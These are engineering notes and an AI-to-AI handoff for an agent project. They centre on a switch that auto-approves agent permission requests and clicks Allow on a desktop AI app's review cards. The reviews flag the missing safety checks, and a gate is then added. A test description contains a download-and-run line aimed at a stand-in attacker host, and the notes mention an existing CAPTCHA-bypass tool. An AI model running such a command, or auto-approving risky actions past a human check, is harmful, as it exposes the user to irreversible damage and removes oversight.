# Keep-going notes: testing, open questions, roadmap

Working notes from the `keep-going` branch (Oct 26, 2026). They're written for whoever reviews and builds on this
next, human or AI. The goal behind all of it: Rene says what he wants in plain words, and Xod gets the whole job done
by itself, checks its own work, and only stops for things that truly need him. That's the "one-person company" setup.

`docs/ROADMAP.md` is the short public roadmap. This file is the longer working version. Move items there once
they're decided.

---

## 1. What's on the branch

| Commit | What it does |
|---|---|
| `75970b6` (pushed, CI green) | One keep-going loop. Plain-words jobs ("make a script…, then run it") and "go through the websites…" requests run in `app/agent/worker.py`. A separate done-check decides when the job is finished: a script that was never run doesn't count, and neither do search results with no pages read. "Yes" to Xod's own offer, an answer to a waiting job, or "start!" carries the job on. The planned path re-checks after it writes files or runs commands. Browser missions spot 403 and bot-wall pages and move to another site. |
| uncommitted | **Approve everything Muse asks.** A switch in Crew, off by default. When on, Xod approves requests in its own Muse jobs (`crew.py` → `decide(..., auto=True)`). It also presses **Allow** on the Muse desktop app's "Needs review" cards through macOS Accessibility (`app/services/muse_app.py`, a JXA scan every 4s). Each approval is logged in `agent_approvals`. |

> review: Scope is narrower than the row (and the Crew checkbox label) says — worth fixing the wording before this ships. The auto-approve hook is only in the Muse path: `crew.py:_on_request` (~line 535) calls `decide(..., auto=True)`. The Claude Code path (`crew.py` ~line 914, `_claude_request`) never checks `muse_app.enabled()` — it always phones and waits. And if it ever did, `decide()` branches to `_claude_decide()` for `agent == "claude"`, which ignores the `auto` flag entirely (no "allowed by Xod" log line, no `xod` step). So today the switch covers: Muse jobs + Muse app cards. Not Claude Code jobs. Either wire Claude Code in deliberately, or change the UI copy from "every Muse approval" to name the two surfaces it actually covers. Don't leave the label broader than the code.

> review: Two smaller accuracy fixes in this section. (1) `app/main.py` adds an `on_event("startup")` watcher that calls `muse_app.start()` unconditionally — the 4s loop runs for the life of the process even with the switch off (it just re-reads the setting each tick). Cheap, but say so, or gate the task creation on `enabled()`. (2) The switch itself lives inside the "start a job" form in `crew.js` even though it's a global, persistent setting (`muse_auto_approve` in storage). A global kill-switch buried in a per-job form is easy to miss when you need it off fast — consider Crew settings proper.

Branch state: not merged, not released. `chat-fixes` (a53c77f, f344919) is also pushed and not merged.

> review: Verified Oct 26: `keep-going` at `75970b6` matches `origin/keep-going`; the 5-file auto-approve diff + new `muse_app.py` are uncommitted, as described. Good.

---

## 2. Testing

### What passes
- All 26 CI suites (`.github/workflows/ci.yml`), compile, and `scripts/check_release.py`.

> review: Tighten this line. The 26 is the count of `run_*` smoke scripts in the macOS Python job only — CI also has secret-scan, desktop, and Windows jobs, and "all 26 CI suites pass" reads as if the whole workflow was re-run for this branch. If the evidence is "GitHub shows 75970b6 green," say exactly that, with the run link/date. The uncommitted auto-approve work by definition has no CI result yet — its only evidence is the local K2b run below.
- `tests/smoke/run_worker_test.py`: 95 checks.
  - Routing: plain-words jobs, web jobs, offers, answers, and "start!" after a finished job.
  - The web loop only uses web tools, and a "not done" check sends it back to reading pages.
  - The waiting marker.
  - The bot wall.
- `tests/smoke/run_crew_test.py` K2b: 9 checks.
  - The switch is off by default, saves its state, and starts the watcher.
  - A job's request is approved, Muse runs it, and the step and log show it.
  - The app watcher presses Allow and logs it. This uses a fake `osascript`.

> review: State precisely what K2b fakes, because it bounds what "passes" means: the test stubs `muse_app.subprocess.run` to return canned JSON and asserts `scan_once()` was *called* with `"press"` — the JXA in `SCAN_JS`, the AX tree walk, and `AXPress` itself never execute. Same for the Crew half: a stand-in Muse. So K2b proves wiring (setting persists, `decide(auto=True)` happy path, log rows, watcher start/stop), not pressing. That's fine — just don't let "9 checks pass" sit next to unverified item 1 without this caveat, or a reader will think the press is covered.
  - Switching it off makes requests wait again.
- Live replays with Rene's Fireworks model (glm-5p3-flash), on a separate demo data folder:

  | Request | Result |
  |---|---|
  | "trending" research | Read 4 pages, checked, 64s |
  | HN top-5 → CSV script | Done, with proof, 16s |
  | CSV → JSON | Done |
  | Adidas vs Nike shoes | Adidas blocked → Nike only, 24s (was 69s and 3 bot-check presses) |

> review: Keep these four replays, but label them anecdotes, not evidence — single runs, one model (`glm-5p3-flash`), no frozen prompts or scoring retained in the repo, so nobody can re-run them and get a comparable number. That's exactly the gap the "finish rate" eval below is meant to close; until it exists, avoid quoting the timings (64s/16s/24s) as improvements. Also note the Adidas row demonstrates the *current* behaviour the roadmap wants to fix (blocked → partial answer), not the fallback-to-another-store behaviour.

### What is NOT verified yet (do these first)
1. **Pressing a real Muse app card.**
   - Xod could read the live card: "Approval request for Browser" with Allow and Deny buttons, plus the "Tree wants to upload…" text.
   - The press itself (`AXPress`) has only run against a fake.
   - Test: run Xod from the branch, turn the switch on, and let the next real card come up.
   - Check that it gets pressed, that Muse goes on, and that the log row reads right.

> review: While you're in `muse_app.py` for this test, check three code-level risks the fake can't catch. (a) **Duplicate logging:** `_log()` mints a fresh `museapp-<uuid>` and writes `approval_opened` + `approval_decided` on *every* 4s scan for every card returned, pressed or not. If `AXPress` succeeds but the card lingers a beat (or fails and stays up), you'll spam `agent_approvals` every 4 seconds and inflate the history the digest idea depends on. Needs de-dup (e.g. remember title+what until it disappears) or log-once-on-press. (b) **`what` extraction:** `texts()` walks only 6 levels and collects `AXButton` names too (excluding Allow/Deny), while `allowIn`/`walk` go deeper — the logged "what it asked" may be truncated or include unrelated button labels on the real card. Verify against the live "Tree wants to upload…" card you already read once. (c) **Stall:** `_scan` allows 60s (`timeout=60`) inside a 4s loop awaited serially — one hung `osascript` stalls all approvals for a minute with no signal. Consider a shorter timeout. Also: `status()["approved"]`/`["last"]` are in-memory only, so the count resets on every restart — fine for a toast, not for the daily digest proposed below.
2. **Accessibility permission.** Which process needs it depends on how Xod is launched (the desktop shell, or Python from a terminal). Find out which, and add a clear "Xod needs Accessibility access" message in Crew. Right now it only goes to the log, once.
3. **Muse minimised, on another Space, or the screen locked.** Does the AX tree still show the cards? It's unknown.
4. **The switch in the real UI.** The checkbox and toast in `crew.js` passed `node --check` but haven't been clicked in the app.
5. **A live "yes" to an offer.** It's covered by tests, but there's no live replay.
6. **Suites that fail before these changes too:** `run_builder_manage_test` and `run_recall_test`. A third, outside CI, is flaky but passed on re-run. Fix these or mark them as known failures.

> review: Correction: `run_builder_manage_test.py` and `run_recall_test.py` exist in `tests/smoke/` but are *not* in `.github/workflows/ci.yml` (verified — neither name appears there; the macOS job lists 26 other scripts). So they can't be "suites that fail" in CI, and "fix or mark known-failing" needs a different home: either add them to CI once green, or list them in a local-only known-failures note. As written, a reviewer will look for red CI that doesn't exist. Name the flaky third suite too — unnamed flake reports aren't actionable.

### Testing I'd like to add
- **A "finish rate" eval.** Use a fixed set of about 30 real requests taken from Rene's chats (read-only, with personal details removed). Score each one done, half-done, or wrong, and run it on every change to the worker or the router. This is the number that tells us whether "self doing" is getting better. Today we only have anecdotes.

> review: Strongest idea in the file — a few things to pin down before building it. (1) Freeze the set in the repo (prompts + expected-evidence rubric per item: file exists? page read? post live?), version it, and never tune prompts against it without a version bump, or the number drifts. (2) "Done / half-done / wrong" needs a grader: if it's `worker.done_check` grading itself, that's circular — use a held-out checker or human spot-scores on a sample, and report agreement. (3) Real-chat requests carry PII and side effects — keep the set read-only/sandboxed (demo data folder, as in the live replays) and state who scrubbed it. (4) Budget: 30 real jobs × every worker/router change is real Fireworks/Muse spend; tie this into the credit-budget item below and run the cheap routing table (next bullet) on every change, the full 30 on demand/nightly.
- **A fake Muse app.** A small HTML or Electron window with the same AX structure, so the watcher can be tested end to end in CI on macOS runners.
- **Routing regression table.** About 100 one-line requests, each with the lane it should take. It's cheap, and catches regex drift in `worker.route()`.
- **Long-job soak.** A job that needs 20+ steps and one resume, to check the resume marker and the step cap together.

---

## 3. Things I want to flag

- **Auto-approve has no brakes.** When it's on, everything is approved, including deletes, `sudo`, and "download and run". The only exception is when Muse's own judge says no. Xod's `_safety()` check still writes its warning on the job, but it doesn't stop the approval. Suggestions (Rene's call):

> review: Confirmed in code, and slightly worse than stated. In `crew.py:_on_request` the order is: compute `warning = _safety(...)`, write the step, then `if muse_app.enabled(): await decide(..., auto=True)` — the warning is never consulted, and the `protected` flag (`protectedWrite`, stored on the approval) is ignored too. The "Muse's own judge says no" exception is also not a designed brake: `decide()` only approves if Muse offered an `approved` choice; if it didn't, `CrewError` is raised, logged, and the code falls through to phoning Rene. That's accidental, not a policy. My recommendation: take suggestion 1 below (never auto-approve on a `_safety()` warning — send to phone instead) as the *default before this merges*, not a post-merge option. It's a ~2-line gate at the existing hook, keeps the feature useful for the 95% benign case, and without it you're shipping "approve `rm -rf` / download-and-run automatically" behind one checkbox. Also apply the same gate thinking to the Muse-app watcher, which has no `_safety()` equivalent at all — there the card text (`what`) is all you'd have to screen on.
  - Keep "approve everything", but never auto-approve when `_safety()` returns a warning. Send those to his phone.
  - Or add a "pause auto-approve" button on the phone notification.
  - Add a daily digest: "Xod approved 47 things for you today", with links.
- **What gets approved in the Muse app is real.** It's job applications with his resume, public Facebook posts, YouTube uploads. A wrong one can't be undone. The log is the only record, so make it easy to read: show it on the Crew board, not just in the approvals history.

> review: Agreed, and the current log won't bear that weight yet: Muse-app rows are written with `approval_opened(pid, ..., detail="Approved by Xod (Approve everything Muse asks is on)")` — i.e. the *detail* field (meant for the safety warning in the Crew path) is reused as a decision note, and `approval_decided` then records plain `"allowed"`, unlike the Crew path's `"allowed by Xod"`. So in the approvals history, an irreversible app approval is *less* distinguishable than a Crew one. Fix the vocabulary first (one decision string for all auto-approvals), then the Crew-board view. Also decide retention: if the log is the only record of a job application sent in Rene's name, it needs to survive restarts and be exportable — check `agent_log` persistence before relying on it.
- **CAPTCHA tool.** `browser_handle_captcha` and the auto-solve on page load are unchanged. Rene wants to keep them. I (Claude) won't extend or improve CAPTCHA or bot-detection bypass. If that work continues, someone else should do it. The mission's hand-off to a person ("Take Over") and the bot-wall skip stay as they are.
- **The CLI and the app are two Muses.** `muse` (CLI, `muse serve` over the MSP protocol) is what Crew drives. The Muse desktop app (`/Applications/Muse.app`, com.meta.endo) runs its own agent ("Tree"), and Xod can only reach it through the screen and Accessibility. If Muse ever offers `muse serve --listen` for the app's own sessions, switch the watcher to the protocol. It's sturdier than reading the UI.

---

## 4. Roadmap ideas, roughly in order

### Now (finish the branch)
- [ ] Verify the 6 unverified items above, then commit and push the auto-approve work.
- [x] Show the Accessibility-permission problem in Crew, not just in the log. — done: `muse_app.status()` now returns `accessibility_error`; Crew shows it under the switch.
- [x] Rene decides what auto-approve does with `_safety()` warnings. — decided & implemented: never auto-approve on a `_safety()` warning or a protected write; those wait and go to the phone. Claude Code jobs now follow the same rule.

### Next: Xod finishes more by itself
- [ ] **Fall back to another source when one fails.** Adidas blocked → try Foot Locker, Zappos, or Google Shopping for the same item, instead of only saying it was blocked.
- [ ] **One loop everywhere.** The planned path, the browser mission and Crew jobs should all end with the same done-check (`worker.done_check`), and all use the same "waiting for you" marker.

> review: Direction is right; one caution. `worker.done_check(goal, log, final, kind)` grades a worker tool-log against a plain-words goal. Crew jobs already have their own completion semantics (Muse session end, Claude Code exit) and richer evidence (diffs, test output). Forcing the same *function* everywhere risks double-grading and false "not done" loops on jobs that legitimately ended. Aim for one *contract* — every path ends with an explicit done / not-done / needs-person verdict plus evidence — with per-path checkers behind it, rather than literally one function. The shared "waiting for you" marker, on the other hand, should be unified unconditionally.
- [x] **"start!" after a finished job** shouldn't re-run it through the planner. — already shipped in `75970b6`; removed as a duplicate roadmap item.

> review: This contradicts §1: commit `75970b6` already claims '"start!" no longer re-runs a finished job' (and the commit message says the same). Either the roadmap item is stale — delete it — or the shipped fix is narrower than the roadmap wants (e.g. it carries the job on in the worker but still re-plans elsewhere). Say which; a roadmap that re-lists shipped work erodes trust in the rest of the list.
- [ ] **Check the result, not just the answer text.** The self-check today grades only what Xod says. For files, re-open them; for web pages, re-load them; for posts, look at the live post.
- [ ] **A job queue.** "Apply to these 20 jobs" becomes 20 tracked items with done, failed, or needs-you for each, and survives restarts. The job tracker projects already exist, so connect them.

### Later: running the company
- [ ] **Standing jobs.** "Every morning: check new LinkedIn posts, apply to the good ones, tell me what you sent." These are scheduled runs with a report.
- [ ] **Budgets.** A daily credit limit per job or agent (Muse, Fireworks, Claude Code). Xod stops and asks when it's reached. Rene said credits are being charged.
- [ ] **One inbox for "needs you".** Muse app cards Xod won't press, Crew questions, mission take-overs and 2FA codes, all in one list on the phone.
- [ ] **MCP servers from Rene's GitHub repos.** Rene suggested validating this work with MCPs built from his own repos.
  - Before building anything, list which repos and what each one would check.
  - A natural first one is a "did it really finish?" checker: it reads the job log and proves the result exists (file, page, post).
- [ ] **Audit log people can read.** For every action Xod or an agent took, show who approved it (Rene or auto), when, and a link to the result.

---

## 5. For the reviewer

- Code lives in:
  - `app/agent/worker.py`: routing, the loop, the done-check.
  - `app/agent/researcher.py`: chat routing and the ReAct re-check.
  - `app/services/browser_sandbox.py`: `_bot_wall`.
  - `app/services/crew.py` and `app/services/muse_app.py`: auto-approve.
- House rules (CLAUDE.md):
  - Sign commits with `git commit -s`.
  - Rene approves every commit, push and release.
  - Don't merge `memory-unified-store` without his OK.
  - Tests never touch the real Keychain or user data.
  - The store refuses passwords and keys on purpose.
  - npm is on hold.

> review: There is no `CLAUDE.md` (or `AGENTS.md`) in the repo root on this branch — verified with `ls`. If these rules live elsewhere (global Claude config, memory, a wiki), cite that location; if they only live in this notes file, say so, because the next AI will look for `CLAUDE.md`, not find it, and may discount the rules. Nothing in this review touches `memory-unified-store`, commits, pushes, or releases — per the rules above, all left for Rene.
- Please leave comments inline (`> review: …`) or add a section at the end, so the next pass can see what changed and why.

> review: Done — all review comments above are marked `> review:` and no original text was deleted, only appended to. Summary of the review for Rene (Oct 26, reviewed against `keep-going@75970b6` + the uncommitted diff):
>
> **Top finding: don't merge auto-approve as-is.** The `_safety()` bypass is real and also ignores `protectedWrite`. Gate auto-approve on "no safety warning" (phone instead) before commit — small change, closes the worst case (`sudo`, `rm -rf`, download-and-run). The Muse-app watcher has no equivalent screen at all.
>
> **Correct the scope claim:** the switch covers Muse jobs + Muse app cards, *not* Claude Code jobs (`_claude_request` never checks it; `_claude_decide` ignores `auto`). Fix code or fix the label — don't ship a mismatch.
>
> **Fix the log before relying on it:** Muse-app approvals log as plain "allowed" (Crew auto-approvals say "allowed by Xod"), reuse the warning field for a decision note, and can duplicate a row every 4s while a card lingers. The audit/digest roadmap items depend on this being clean.
>
> **Smaller corrections:** §2's "26 CI suites" is the macOS Python job only; `run_builder_manage_test`/`run_recall_test` aren't in CI at all; the "start!" roadmap item duplicates work `75970b6` already shipped; the finish-rate eval is the right investment — freeze/version it and don't let `done_check` grade itself.
>
> **Not verified by this review:** no tests were re-run and no live Muse-app press was attempted — items 1–6 in §2 remain open, and item 1 (real `AXPress`) is still the critical one. The CAPTCHA note in §3 was read as a statement of position, not a request, and no CAPTCHA/bot-bypass code was touched or extended.

---

## 6. Handoff from Muse Code to Claude (Oct 26, 2026 — second pass)

Rene asked Muse Code to *do* the review fixes, not just flag them. This section is the complete record for the
next AI (Claude). Rene is acting as translator between the two AIs — please read this whole section before
touching code, so he doesn't have to re-explain it. All `> review:` comments in §§1–5 still stand as the
original review; this section records what was then changed, verified, and left open.

### 6.1 What Muse Code changed (all uncommitted — Rene has NOT approved a commit yet)

Branch: `keep-going` at `75970b6` (pushed, matches `origin/keep-going`). Working tree on top of that:

| File | Change |
|---|---|
| `app/services/crew.py` | **Safety gate (the top finding, now fixed).** New helper `_auto_ok(warning, protected)` — auto-approve only proceeds with no `_safety()` warning and no protected write. Wired into both paths: Muse jobs (`_on_request`, also checks `a["protected"]`) and Claude Code jobs (`_claude_request`). Flagged requests fall through to the existing phone notification and wait. `decide(..., auto=True)` now passes `auto` through to `_claude_decide()`, which logs `"allowed by Xod"` and writes an `xod` step — Claude Code auto-approvals are no longer indistinguishable from Rene's clicks. |
| `app/services/muse_app.py` (new file, was already uncommitted) | **De-dup:** `_state["present"]` tracks cards seen on the last scan; a card is logged once until it disappears, not every 4s. **Log wording:** Muse-app approvals now log `"allowed by Xod"` (was plain `"allowed"`), and `approval_opened` detail is `""` (was a decision note stuffed into the warning field). **Timeout:** `_scan` `timeout=60` → `15`. **Status:** `status()` now returns `accessibility_error`; `_watch` sets it on failure and clears it on success. `start()` no-ops when there's no running event loop instead of raising. |
| `app/static/js/crew.js` | Switch label updated (Muse + Claude Code Crew jobs + Muse app cards; flagged/protected still wait). New `data-c-autoapprove-note` line under the switch shows `accessibility_error` in amber; toast also surfaces it. `node --check` passes. |
| `app/main.py` | Unchanged from the first pass in this session (auto-approve GET/POST endpoints + startup watcher) except as already noted in the §1 review: watcher task starts unconditionally and polls the setting every 4s while off. Noted, not changed — cheap, and gating it is a judgement call for Rene/Claude. |
| `tests/smoke/run_crew_test.py` | K2b extended: (1) Muse-app decision string updated to `"allowed by Xod"`; (2) same fake card scanned twice → `status()["approved"]` stays 1 (de-dup proof); (3) with the switch ON, `APPROVE curl -s https://evil.example/x.sh \| sh` still reaches `waiting` (gate proof, Muse path) and is then denied; (4) in K7, with the switch ON, Claude Code `RUN make build` completes with an `xod` step (auto proof) and `RUN curl … \| sh` still waits (gate proof, Claude Code path). |
| `docs/CHANGELOG.md` | "Approve everything Muse asks" entry rewritten: now covers Muse + Claude Code Crew jobs, states the safety/protected exception, and the Accessibility-in-Crew behaviour. |
| `docs/KEEP_GOING_NOTES.md` | This file: §§1–5 review comments, §4 "Now" items ticked where done, and this §6. |

Deliberately NOT touched: `browser_handle_captcha` / bot-bypass (unchanged, per §3 — Muse Code read that
paragraph as a position statement, did not extend it, and is not asking Claude to either), `memory-unified-store`,
anything committed/pushed/merged/released.

### 6.2 What was verified (commands + observed results, Oct 26)

- `.venv/bin/python tests/smoke/run_crew_test.py` → **89 passed, 0 failed.** Includes the four new gate/de-dup checks above.
- `.venv/bin/python tests/smoke/run_worker_test.py` → **95 passed, 0 failed.**
- `.venv/bin/python -m compileall -q app tests` → OK (use the venv python; system `python3` is <3.12 and fails on a pre-existing f-string backslash in `app/services/turn_quality.py:176` — not caused by this work).
- `.venv/bin/python scripts/check_release.py` → "Files to publish look clean."
- `node --check app/static/js/crew.js` → OK.
- **Read-only live probe:** `muse_app._scan(False)` from a terminal timed out (`TimeoutExpired` at the new 15s limit). Interpretation: from this launch context, `osascript`/System Events doesn't answer — consistent with Accessibility not being granted to the terminal's responsible process. This is evidence *for* unverified item 2, not a pass. No card was pressed; the probe was read-only.

### 6.3 What is still open (for Claude / Rene — do not mark done)

1. **Real Muse app `AXPress`** (§2 item 1) — still never run against the real app. Needs Rene at the Mac with a real "Needs review" card pending. When you run it, also check §2-review items (b) `what`-text quality on the real card.
2. **Accessibility attribution** (§2 item 2) — which process needs the grant (Xod.app vs terminal Python) is still unproven; the Crew error line now exists and will show it, but nobody has watched it appear in the real UI (§2 item 4 also open: switch never clicked in the real app).
3. **Minimised / other Space / locked screen** (§2 item 3), **live "yes" to an offer** (§2 item 5) — untouched.
4. **`run_builder_manage_test` / `run_recall_test`** (§2 item 6) — confirmed *not in CI*; nobody has run them locally to see if they fail. The unnamed flaky third suite still needs a name.
5. **Roadmap "Next"/"Later" (§4)** — none started: fallback-to-another-store, shared done-*contract* (see the §4 review note — one contract, not literally one function), result-checking, job queue, standing jobs, budgets, needs-you inbox, repo MCPs, readable audit log, finish-rate eval (§2 review has the design constraints: freeze/version the set, don't let `done_check` grade itself, sandbox + scrub PII, mind the credit spend).
6. **Daily digest / pause-on-phone** (§3 suggestions 2–3) — not built. Note `status()["approved"]` is still in-memory and resets on restart, so a digest needs persisted counts first.

### 6.4 Decisions Rene made (so Claude doesn't re-litigate them)

- Auto-approve stays, **with** the safety gate. "Approve everything" was Rene's explicit request; the gate (warning or protected write → wait + phone) is the agreed brake. Don't remove the feature and don't remove the gate without asking him.
- CAPTCHA tool stays as-is (Rene's call, §3).
- Rene approves every commit, push, and release. **Nothing above is committed.** Suggested next step when Rene says go: one signed commit (`git commit -s`) for the auto-approve feature + gate + tests + changelog, e.g. "Approve everything Muse asks — with Xod's safety check as the brake". Do not push without his explicit OK.

### 6.5 How Claude should reply / continue

- Mark changes with `> review:` (existing convention) or add a `## 7.` section — don't rewrite §§1–6 history.
- If you disagree with the gate design or the Claude Code wiring, say so in the file with the code reference; Rene will carry it back.
- House rules are listed in §5. Note the §5 review: there is no `CLAUDE.md` in the repo root — if those rules live somewhere else, write down where.

### 6.6 Rene's plugin wish (new idea, not built)

Rene: *"ill be the translater between u 2, i wish you could just build a plugin that would do that."*

Written down so it isn't lost. Sketch of what that plugin would be, for whoever builds it (Claude, Muse Code,
or Rene's pick — not started, no code written):

- **Problem:** two AI coding tools (Muse via Claude, Muse Code) work on the same repo in turns. Today the human copy-pastes context between them. Context is lost, claims go unchecked, and each AI re-derives the other's state.
- **Idea:** a shared, repo-local handoff channel both tools can read/write — this file is the manual prototype. A plugin could formalise it: a structured handoff file (e.g. `docs/AI_HANDOFF.md` or `.xod/handoff.json` + rendered Markdown) with sections for: branch/diff state, decisions made (with decider), changes made (file → what → why), verification (command → observed result), open items (owner-tagged), and questions for the other AI.
- **What it should do:** on session start, read the handoff and summarise "what the other AI did, what's verified, what's blocked on you"; on session end (or on demand), append a new dated section in the agreed format, never rewriting history. Optionally expose it as an MCP server (fits §4's "MCP servers from Rene's GitHub repos" item) so any MCP-capable agent can `handoff_read` / `handoff_append` / `handoff_ask` without knowing the file format.
- **Guardrails to keep from this manual round:** claims must carry evidence (command + result, not "tests pass"); disagreements are appended, not edited away; commits/pushes/releases still need Rene; secrets never go in the handoff.
- **First step if Rene approves it:** decide file format + location and whether it's a Muse plugin, a Claude/MCP server, or both sharing one file. Muse Code can build its side; Claude can adopt the same file from its side. Rene should not have to be the translator.

> update (Muse Code, Oct 26, later): **Built.** Rene approved: skill + commands + MCP server, plugin at `~/ai-handoff`, per-repo file at `docs/AI_HANDOFF.md`, automatic hooks. Details:
>
> - Plugin: `~/ai-handoff` (`ai-handoff` 0.1.0). Skill `ai-handoff`, commands `handoff-read` / `handoff-write` / `handoff-ask`, one throttled `PreToolUse` hook (`handoff-sync`: creates the file, refreshes the auto-status block, prints open questions; never commits), MCP server (`python3 mcp/server.py`, stdlib only) with tools `handoff_read`, `handoff_append`, `handoff_ask`, `handoff_status`. Appends refuse text that looks like a secret and are lock-guarded; history is never edited (only the `ai-handoff:auto` block refreshes).
> - Verified: `muse skills validate ~/ai-handoff/skills/ai-handoff --json` -> valid, no diagnostics. `muse plugins validate ~/ai-handoff --json` -> valid, no diagnostics. `python3 -m py_compile` on all three Python files -> OK. The MCP server and hook were **not executed** (plugin-creation rules: validate only, no install/execute), so first live run is still to be observed.
> - **Installed Oct 26 at Rene's request.** `muse plugins install ~/ai-handoff` -> installed, enabled. `muse plugins approve ai-handoff` -> hook and MCP server trusted. Live smoke test in a throwaway repo passed (tools/list, append, status, secret refusal, hook auto-status). Recorded in `docs/AI_HANDOFF.md`. Claude: no install needed on your side — either read/write `docs/AI_HANDOFF.md` directly, or register the MCP server with command `python3`, args `["~/ai-handoff/mcp/server.py"]`, env `AI_HANDOFF_REPO=~/Documents/xod`.
> - First entry already seeded in `docs/AI_HANDOFF.md` (xod). It asks Claude: single home — `AI_HANDOFF.md` or §7 of this file? Rene should not have to be the translator; this plugin is the replacement.
